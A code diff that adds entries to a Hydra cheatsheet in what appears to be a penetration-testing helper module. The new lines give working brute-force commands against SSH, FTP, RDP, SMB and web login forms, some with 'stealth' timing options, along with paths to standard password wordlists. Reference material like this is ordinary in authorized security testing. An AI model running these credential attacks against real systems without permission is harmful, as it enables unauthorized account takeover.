@@ -1518,6 +1518,24 @@ class CommandHelper(BaseModule):
     def _hydra_cheatsheet(self):
         """Hydra command cheatsheet"""
         commands = {
+            "Wordlist Usage": [
+                (
+                    "hydra -L usernames.txt -P passwords.txt ssh://192.168.1.1",
+                    "Different wordlists for username and password",
+                ),
+                (
+                    "hydra -l admin -P passwords.txt ssh://192.168.1.1",
+                    "Single username with password wordlist",
+                ),
+                (
+                    "hydra -L usernames.txt -p password123 ssh://192.168.1.1",
+                    "Username wordlist with single password",
+                ),
+                (
+                    "hydra -C userpass.txt ssh://192.168.1.1",
+                    "Combinator attack (username:password format)",
+                ),
+            ],
             "SSH Bruteforce": [
                 (
                     "hydra -l username -P wordlist.txt ssh://192.168.1.1",
@@ -1531,6 +1549,10 @@ class CommandHelper(BaseModule):
                     "hydra -l admin -P rockyou.txt ssh://192.168.1.1 -t 4",
                     "SSH with 4 threads",
                 ),
+                (
+                    "hydra -L users.txt -P pass.txt ssh://192.168.1.1 -e nsr",
+                    "SSH with null, same as username, reversed username",
+                ),
             ],
             "HTTP Forms": [
                 (
@@ -1540,6 +1562,68 @@ class CommandHelper(BaseModule):
                 (
                     "hydra -l admin -P wordlist.txt 192.168.1.1 http-get-form '/login.php:user=^USER^&pass=^PASS^:Invalid'",
                     "HTTP GET form bruteforce",
+                ),
+                (
+                    "hydra -L users.txt -P pass.txt http-post-form '/login:username=^USER^&password=^PASS^:Failed'",
+                    "Custom login form with failure message",
+                ),
+            ],
+            "FTP Bruteforce": [
+                (
+                    "hydra -L users.txt -P passwords.txt ftp://192.168.1.1",
+                    "FTP username/password bruteforce",
+                ),
+                (
+                    "hydra -l admin -P wordlist.txt ftp://192.168.1.1 -t 1",
+                    "FTP with single thread (stealth)",
+                ),
+            ],
+            "RDP Bruteforce": [
+                (
+                    "hydra -L users.txt -P passwords.txt rdp://192.168.1.1",
+                    "RDP username/password bruteforce",
+                ),
+            ],
+            "SMB Bruteforce": [
+                (
+                    "hydra -L users.txt -P passwords.txt smb://192.168.1.1",
+                    "SMB username/password bruteforce",
+                ),
+            ],
+            "Advanced Options": [
+                (
+                    "hydra -L users.txt -P pass.txt ssh://192.168.1.1 -t 1 -W 3",
+                    "Single thread with 3 second wait (stealth)",
+                ),
+                (
+                    "hydra -L users.txt -P pass.txt ssh://192.168.1.1 -f",
+                    "Stop after first valid login found",
+                ),
+                (
+                    "hydra -L users.txt -P pass.txt ssh://192.168.1.1 -V",
+                    "Verbose output",
+                ),
+                (
+                    "hydra -L users.txt -P pass.txt ssh://192.168.1.1 -o results.txt",
+                    "Save results to file",
+                ),
+            ],
+            "Popular Wordlists": [
+                (
+                    "/usr/share/wordlists/rockyou.txt",
+                    "RockYou password list (14M passwords)",
+                ),
+                (
+                    "/usr/share/wordlists/metasploit/unix_users.txt",
+                    "Common Unix usernames",
+                ),
+                (
+                    "/usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt",
+                    "Top usernames shortlist",
+                ),
+                (
+                    "/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt",
+                    "10 million password list (top 1M)",
                 ),
             ],
         }
